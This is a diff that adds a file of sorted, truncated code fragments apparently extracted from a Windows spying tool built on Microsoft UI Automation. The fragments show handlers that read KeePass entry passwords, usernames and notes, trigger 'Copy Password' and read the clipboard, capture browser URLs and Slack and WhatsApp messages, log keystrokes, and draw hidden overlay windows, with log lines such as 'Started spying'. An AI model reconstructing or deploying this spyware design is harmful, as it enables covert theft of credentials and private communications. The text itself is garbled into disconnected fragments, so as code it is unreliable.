@@ -1,0 +1,471 @@
+"( cmdOptionExists(argv, argv + argc, L""-h"""
+"(!cmdOptionExists(argv, argv + argc, L""--no-property-events"""
+"(!cmdOptionExists(argv, argv + argc, L""--no-uia-events"""
+"(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"""
+"(&localTime, &now_c"
+"(&localTime, L""%H:%M:%S"""
+"(&localTime, L""%Y-%m-%d"""
+"(&logFile, g_LogFileName.c_str("
+"() { HandleChrome(pAutomationElement, wsProcName, wsDate, propId, vVar"
+"() { HandleExplorer(pAutomationElement, wsProcName, wsEventString, wsDate, eventID"
+"() { HandleFirefox(pAutomationElement, wsProcName, wsEventString, wsDate, eventID"
+"() { HandleKeepass(pAutomationElement, wsProcName, wsDate, propId, vVar"
+"() { HandleSlackFF(pAutomationElement, wsProcName, wsDate"
+"() { HandleWhatsAppFF(pAutomationElement, wsProcName, wsDate"
+"(), output.begin("
+"(*pOverlayWnd, HWND_TOPMOST, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, SWP_SHOWWINDOW"
+"(*pOverlayWnd, RGB(192, 192, 192"
+"(*pOverlayWnd, SW_SHOW"
+"(0, &pEntryChildTitleElement"
+"(0, &pMainWindow"
+"(0, pos"
+"(1, &pEntryChildUsernameElement"
+"(2, &pEntryChildPasswordElement"
+"(3, &pEntryChildUrlElement"
+"(4, &pEntryChildNotesElement"
+"(EnumProcessModules(hProcess, hMods, sizeof(hMods"
+"(GetModuleFileNameEx(hProcess, hMods[0], moduleName, sizeof(moduleName"
+"(HWND handle, LPARAM lParam"
+"(HWND hwnd, HWND* overLayHwnd"
+"(HWND hwnd, HWND* pOverlayWnd"
+"(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam"
+"(IUIAutomation* pAutomation, DWORD pid"
+"(IUIAutomation* pAutomation, IUIAutomationElement* pAutomationElement, int timeout"
+"(IUIAutomation* pAutomation, wchar_t* windowName"
+"(IUIAutomation*, IUIAutomationElement*, int"
+"(IUIAutomationElement* pAutomationElement, BSTR* bWindowName"
+"(IUIAutomationElement* pAutomationElement, EVENTID eventID"
+"(IUIAutomationElement* pAutomationElement, PROPERTYID propId, VARIANT vVar"
+"(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate"
+"(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar"
+"(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsEventString, const std::wstring& wsDate, EVENTID eventID"
+"(IUIAutomationElement* pAutomationElementChild, BSTR* bWindowName"
+"(IUIAutomationElement* pStartElement, IUIAutomationCondition* pAutomationCondition"
+"(IUIAutomationElement*, PROPERTYID, VARIANT"
+"(L""/"""
+"(L"":"""
+"(L""://"""
+"(L""Arrived unknown event in HandleFirefox("
+"(L""Arrived unknown event in HandleOther("
+"(L""Can't create condition for password elements"", DBG"
+"(L""Can't create database property condition"", DBG"
+"(L""Can't create m_lvEntries property condition"", DBG"
+"(L""Can't create property arrray"", WARNING"
+"(L""Can't create property condition"", DBG"
+"(L""Can't create true condition"", DBG"
+"(L""Can't create true property condition"", DBG"
+"(L""Can't find Database tree element"", DBG"
+"(L""Can't find msg receiver gui element"", DBG"
+"(L""Can't find navigation bar of firefox!"", DBG"
+"(L""Can't find parent element"", DBG"
+"(L""Can't find password list in keepass.exe"", DBG"
+"(L""Can't find passwords in the list"", DBG"
+"(L""Can't find selected db. May be we are in the root"", DBG"
+"(L""Can't get current class name"", DBG"
+"(L""Can't get current control type"", DBG"
+"(L""Can't get db name"", DBG"
+"(L""Can't get element from list in keepass.exe"", DBG"
+"(L""Can't get help property value"", DBG"
+"(L""Can't get localized control type"", DBG"
+"(L""Can't get msg receiver name"", DBG"
+"(L""Can't get name of the Web Slack Message field"", DBG"
+"(L""Can't get pAutomation from g_pMyTreeWalker in HandleKeepass("
+"(L""Can't get pAutomation from g_pMyTreeWalker("
+"(L""Can't get property value"", WARNING"
+"(L""Can't get url value"", WARNING"
+"(L""Can't get value of the Web Slack Message field"", DBG"
+"(L""Can't get window name value"", WARNING"
+"(L""Can't get window name"", DBG"
+"(L""Cant find GUI by pid!!!. Try to use --windowname"", WARNING"
+"(L""Cant find GUI by windowname!!!. Try to use --pid"", WARNING"
+"(L""Cant find HWND"", WARNING"
+"(L""Cant find profile info"", DBG"
+"(L""Cant get AriaRolePropertyId from WebWhatsappFF handler"", DBG"
+"(L""Cant get LegacyIAccessibleRolePropertyId from WebWhatsappFF handler"", DBG"
+"(L""Cant get msg contents"", DBG"
+"(L""Cant get pAutomation from g_pMyTreeWalker"", DBG"
+"(L""Cant get treewalker"", DBG"
+"(L""CoCreateInstance("
+"(L""CoInitializeEx("
+"(L""Database"""
+"(L""Database: "" + std::wstring(bDbName"
+"(L""Failed to add event handler for event ID: "" + std::to_wstring(eventIds[i]"
+"(L""Failed to add property changed event handler"" , WARNING"
+"(L""Failed to create TreeWalker. pUIAutomation was NULL"", WARNING"
+"(L""Failed to create TreeWalker."", WARNING"
+"(L""Failed to find windows!"", WARNING"
+"(L""Failed to get parent name"", DBG"
+"(L""Failed to get parent."", WARNING"
+"(L""FindWindows("
+"(L""Found "" + std::to_wstring(count"
+"(L""Found active windows: "" + std::to_wstring(length"
+"(L""HandleExplorer("
+"(L""HandleFirefox("
+"(L""HandleKeepass("
+"(L""HandleOther("
+"(L""IUIAutomation creating success"", DBG"
+"(L""IUIAutomation->CreateTrueCondition("
+"(L""IUIAutomation->GetRootElement("
+"(L""Monitoring from root"", INFO"
+"(L""MyAutomationEventHandler::HandleAutomationEvent("
+"(L""New property event from "" + wsProcName + L"" Time: "" + wsDate, DBG"
+"(L""New uia event "" + wsEventString + L"" from "" + wsProcName + L"" Time: "" + wsDate, DBG"
+"(L""Property changed"", DBG"
+"(L""See everything into the log files"", INFO"
+"(L""Spying "" + std::to_wstring(pid"
+"(L""Spying "" + std::wstring(windowName"
+"(L""Started spying using MyAutomationEventHandler"", INFO"
+"(L""Started spying using MyPropertyChangedEventHandler"", INFO"
+"(L""Successfully find Copy Password field!"", DBG"
+"(L""Todo :"
+"(L""Too fast events..."", DBG"
+"(L""URL: "" + wsUrl, DBG"
+"(L""Window Name for MyAutomationEventHandler("
+"(L""Window Name for MyPropertyChangedEventHandler("
+"(L""[-] Err msg: "" + std::wstring(errMsg"
+"(L""\\"""
+"(L""pAutomation->CreatePropertyCondition("
+"(L""pAutomation->CreateTrueCondition("
+"(L""pAutomation->FindAll("
+"(L""pAutomation->GetRootElement("
+"(L""pChildEl->GetCurrentPropertyValue(PID"
+"(L""pChildEl->get_CurrentName("
+"(L""pElementsArray->GetElement("
+"(L""pRootElement->FindAll("
+"(L""pWalker was null"", WARNING"
+"(L""urlbar-input"""
+"(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0"
+"(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0"
+"(MyAutomationEventHandler::Deploy, pAutomation, pAutomationElement, timeout"
+"(MyPropertyChangedEventHandler::Deploy, pAutomation, pAutomationElement, timeout"
+"(NULL, COINIT_MULTITHREADED"
+"(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid"
+"(REFIID riid, void** ppInterface"
+"(RGB(192, 192, 192"
+"(TreeScope_Children, pBranchDbTreeElementCondition, &pBranchDbTreeElement"
+"(TreeScope_Children, pCondition, &pElementArray"
+"(TreeScope_Children, pCondition, &pElementsArray"
+"(TreeScope_Children, pConditionToElementArrayWithoutHelpButtons, &pElementArrayWithoutHelpButtons"
+"(TreeScope_Children, pCopyPasswordButtonCondition, &pCopyPasswordButton"
+"(TreeScope_Children, pDropDownMenuCondition, &pDropDownMenu"
+"(TreeScope_Children, pTrueCondition, &pEntryChild"
+"(TreeScope_Subtree, pAutomationCondition, &pFoundElement"
+"(UIA_AriaRolePropertyId, &vAriaRoleValue"
+"(UIA_AutomationIdPropertyId, &vValue"
+"(UIA_AutomationIdPropertyId, _variant_t(L""MainForm"""
+"(UIA_AutomationIdPropertyId, _variant_t(L""m_lvEntries"""
+"(UIA_AutomationIdPropertyId, vAutomationId, &pCondition"
+"(UIA_ControlTypePropertyId, CComVariant(UIA_ButtonControlTypeId"
+"(UIA_ControlTypePropertyId, _variant_t(UIA_ListItemControlTypeId"
+"(UIA_InvokePatternId, (IUnknown**"
+"(UIA_IsInvokePatternAvailablePropertyId, CComVariant(true"
+"(UIA_IsScrollItemPatternAvailablePropertyId, CComVariant(true"
+"(UIA_LegacyIAccessibleDefaultActionPropertyId, CComVariant(L""click"""
+"(UIA_LegacyIAccessibleHelpPropertyId, &vHelp"
+"(UIA_LegacyIAccessibleRolePropertyId, &vIAccessibleRoleValue"
+"(UIA_NamePropertyId, _variant_t(L""Copy Password"""
+"(UIA_NamePropertyId, _variant_t(L""Database"""
+"(UIA_NamePropertyId, _variant_t(L""DropDown"""
+"(UIA_NamePropertyId, vWindowName, &pCondition"
+"(UIA_ProcessIdPropertyId, &vPid"
+"(UIA_SelectionItemIsSelectedPropertyId, _variant_t(true"
+"(UIA_ValueValuePropertyId, &vMsgValue"
+"(UIA_ValueValuePropertyId, &vUrlBar"
+"(UIA_ValueValuePropertyId, &vValue"
+"(VT_I4, 0, propertyIds.size("
+"(argv, argv + argc, L""--logfile"""
+"(argv, argv + argc, L""--pid"""
+"(argv, argv + argc, L""--timeout"""
+"(argv, argv + argc, L""--window"""
+"(bName, SysStringLen(bName"
+"(bWindowName, SysStringLen(bWindowName"
+"(begin, end, option"
+"(cmdOptionExists(argv, argv + argc, L""--debug"""
+"(cmdOptionExists(argv, argv + argc, L""--help"""
+"(cmdOptionExists(argv, argv + argc, L""--ignore-handlers"""
+"(cmdOptionExists(argv, argv + argc, L""--logfile"""
+"(cmdOptionExists(argv, argv + argc, L""--pid"""
+"(cmdOptionExists(argv, argv + argc, L""--timeout"""
+"(cmdOptionExists(argv, argv + argc, L""--window"""
+"(cmdOptionExists(argv, argv + argc, L""find"""
+"(cmdOptionExists(argv, argv + argc, L""spy"""
+"(const std::wstring& message, LogLevel level"
+"(data.hwnd, &pAutomationElement"
+"(data.pid != process_id || !(GetWindow(handle, GW_OWNER"
+"(enum_windows_callback, (LPARAM"
+"(eventIds[i], pAutomationElement, TreeScope_Subtree, NULL, (IUIAutomationEventHandler*"
+"(hConsole, 0x07"
+"(hConsole, 0x0C"
+"(handle, &process_id"
+"(hdc, &ps.rcPaint, hBrush"
+"(hwnd, &ps"
+"(hwnd, &rect"
+"(hwnd, SW_HIDE"
+"(hwnd, msg, wParam, lParam"
+"(i, &pChildEl"
+"(i, &pEntryElement"
+"(int argc, wchar_t* argv[]"
+"(logFile, L""%ls\n"", message.c_str("
+"(logFile, L""[DEBUG] %ls\n"", message.c_str("
+"(logFile, L""[INFO] %ls\n"", message.c_str("
+"(logFile, L""[WARNING] %ls\n"", message.c_str("
+"(originalCursorPos.x, originalCursorPos.y"
+"(pAndCondition1, pInvokePatternCondition, &pAndCondition2"
+"(pAndCondition2, pScrollItemPatternCondition, &pAndCondition3"
+"(pAutomation, pid"
+"(pAutomation, windowName"
+"(pAutomationElement, &bWindowName"
+"(pAutomationElement, TreeScope_Subtree, NULL, pMyPropertyChangedEventHandler, propertyArray"
+"(pAutomationElement, pAndCondition3"
+"(pAutomationElement, pCondition"
+"(pAutomationElement, pDbTreeElementCondition"
+"(pAutomationElement, pPassListCondition"
+"(pAutomationElement, wsProcName, wsDate, propId, vVar"
+"(pAutomationElement, wsProcName, wsEventString, wsDate, eventID"
+"(pAutomationElementProfileInfo, &pAutomationElementReceiver"
+"(pChild, &pParent"
+"(pControlTypeCondition, pDefaultActionCondition, &pAndCondition1"
+"(pEntryChildPasswordElement, pMainWindowCondition"
+"(previousDb != NULL && wcscmp(previousDb, bDbName"
+"(propertyArray, &index, &propertyIds[i]"
+"(pt.x, pt.y"
+"(vAriaRoleValue.bstrVal, L""textbox"""
+"(vValue.bstrVal, L""Header"""
+"(vVar.boolVal ? L""true"" : L""false"""
+"(wchar_t** begin, wchar_t** end, const std::wstring& option"
+"(wsLogKeyStroke, EMPTY"
+( eventID == UIA_Text_TextChangedEventId || eventID == UIA_Text_TextSelectionChangedEventId
+(!OpenClipboard(NULL
+(!g_LogFileName.empty(
+(!pAutomationElement
+(!pAutomationElementParent
+(!propertyArray
+(&bClassName
+(&bDbName
+(&bLocalizedControlType
+(&bMsgReceiver
+(&bName
+(&bNotes
+(&bPassword
+(&bTitleName
+(&bURL
+(&bUserName
+(&bWindowName
+(&count
+(&ctId
+(&eventCount
+(&length
+(&originalCursorPos
+(&pAutomationElement
+(&pCondition
+(&pRootElement
+(&pTargetElement
+(&pTrueCondition
+(&pWalker
+(&rect
+(&refCount
+(&vAriaRoleValue
+(&vAutomationId
+(&vHelp
+(&vIAccessibleRoleValue
+(&vMsgValue
+(&vPid
+(&vUrlBar
+(&vValue
+(&vWindowName
+(&wc
+('$(UserRootDir
+((hash << 5
+((propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId
+((std::wstring(vValue.bstrVal
+() : refCount(1
+(*bWindowName
+(0
+(1
+(300
+(CF_UNICODETEXT
+(CONTROLTYPEID controlTypeId
+(Configuration
+(DWORD pid
+(EVENTID eventID
+(Ex: inserted a value
+(Ex: opened a new window
+(ExtensibilityGlobals
+(FAILED(hr
+(Finder::DisplayActiveWindows(
+(GUI Required
+(GetLastError(
+(GlobalLock(hData
+(HANDLEDATA*
+(HRESULT hr
+(HWND
+(HWND hwnd
+(Helpers::ConvertToLower(wsDomain
+(Helpers::ConvertToLower(wsProcName
+(IUIAutomation
+(IUIAutomation*
+(IUIAutomation* pUIAutomation
+(IUIAutomationElement* child
+(IUIAutomationElement* pAutomationElement
+(IUIAutomationElement* pChild
+(NULL
+(Platform
+(PreprocessorDefinitions
+(ProjectConfigurationPlatforms
+(STD_OUTPUT_HANDLE
+(SUCCEEDED(hr
+(SolutionConfigurationPlatforms
+(SolutionProperties
+(SysStringLen(*bWindowName
+(UserRootDir
+(VARIANT vVar
+(VCTargetsPath
+(V_VT(&vPid
+(__uuidof(CUIAutomation
+(_fileno(logFile
+(_fileno(stdout
+(argc == 1
+(automationThread.joinable(
+(bClassName
+(bDbName
+(bLocalizedControlType
+(bMsgReceiver
+(bName
+(bNotes
+(bPassword
+(bTitleName
+(bURL
+(bUrlBar
+(bUserName
+(bWindowName
+(bWindowName == NULL
+(c
+(const std::wstring& data
+(const std::wstring& fullPath
+(const std::wstring& input
+(const std::wstring& string
+(const std::wstring& url
+(controlTypeId
+(ctId
+(data.hwnd == NULL
+(default 1 sec
+(eventID
+(g_DebugModeEnable
+(g_IgnoreHandlers
+(g_pMyTreeWalker
+(hBrush
+(hData
+(hData != NULL
+(hProcess
+(hProcess == NULL
+(handle
+(high load may be!
+(hr
+(https://cicada-8.medium.com/im-watching-you-how-to-spy-windows-users-via-ms-uia-c9acd30f94c4
+(https://github.com/user-attachments/assets/03458550-9aef-4eaf-b99c-1c98e62ba61e
+(https://github.com/user-attachments/assets/052ae59a-67d8-4d04-9fa1-847a34562af6
+(https://github.com/user-attachments/assets/b5559d1f-8916-4b58-ac0d-016c62e2aae4
+(https://github.com/user-attachments/assets/b88fb837-4cba-4312-8f25-6eb766239544
+(https://github.com/user-attachments/assets/c7e7c40c-5137-44c0-a96d-b044505a177c
+(https://github.com/user-attachments/assets/e14839f0-5692-4eed-868e-4dd3e9336667
+(hwnd
+(hwnd != NULL
+(i
+(input.begin(
+(int
+(int i = 0; i < count; i++
+(int i = 0; i < length; i++
+(int seconds
+(it != controlTypeIdMap.end(
+(it != eventIdMap.end(
+(it != handlers.end(
+(itr != end && ++itr != end
+(lastSlashPos != std::wstring::npos
+(lastSlashPos + 1
+(level
+(logFile
+(logFile == nullptr || err != 0
+(logMutex
+(moduleName
+(msg
+(now
+(now - lastEventTime < GetEventTimeout(
+(one of the UIA components
+(pAutomation
+(pAutomation == NULL
+(pAutomationElement
+(pAutomationElement == NULL
+(pAutomationElementChild
+(pAutomationElementProfileInfo == NULL
+(pAutomationElementUrlBar == NULL
+(pBranchDbTreeElement == NULL
+(pChildEl
+(pCurrentElement
+(pCurrentElement == NULL
+(pData != NULL
+(pDbTreeElement == NULL
+(pFoundElement == NULL
+(pMainWindow != NULL
+(pPassListEl == NULL
+(pStartElement
+(pUIAutomation == NULL
+(pWalker != NULL
+(pWalker == NULL
+(pid
+(pid != -1
+(pid == -1
+(pos != std::wstring::npos
+(pos + 3
+(previousDb
+(propId
+(propId == UIA_NamePropertyId || propId == UIA_ValueValuePropertyId
+(propertyChangedThread.joinable(
+(rect.left + rect.right
+(rect.top + rect.bottom
+(refCount == 0
+(riid == __uuidof(IUIAutomationEventHandler
+(riid == __uuidof(IUIAutomationPropertyChangedEventHandler
+(riid == __uuidof(IUnknown
+(s
+(seconds
+(size_t i = 0; i < eventIds.size(
+(size_t i = 0; i < propertyIds.size(
+(static_cast<int>(vVar.bVal
+(static_cast<unsigned int>(vVar.bVal
+(std::wcstoul(pidStr.c_str(
+(std::wstring& clipboardData
+(this
+(timeout
+(true
+(vHelp.bstrVal
+(vMsgValue.bstrVal
+(vUrlBar.bstrVal
+(vValue.bstrVal
+(vVar
+(vVar.bstrVal
+(vVar.cyVal.int64
+(vVar.date
+(vVar.dblVal
+(vVar.fltVal
+(vVar.iVal
+(vVar.intVal
+(vVar.lVal
+(vVar.llVal
+(vVar.scode
+(vVar.uiVal
+(vVar.uintVal
+(vVar.ulVal
+(vVar.ullVal
+(vVar.vt
+(vVar.vt == VT_BSTR
+(vVar.vt == VT_BSTR && (std::wstring(vVar.bstrVal
+(vVar.vt == VT_EMPTY
+(void**
+(wchar_t
+(wchar_t c : data
+(windowName
+(wsClipBoardData
+(wsControlType
+(wsFileName
+(wsFileName.empty(
+(wsWindowName.empty(
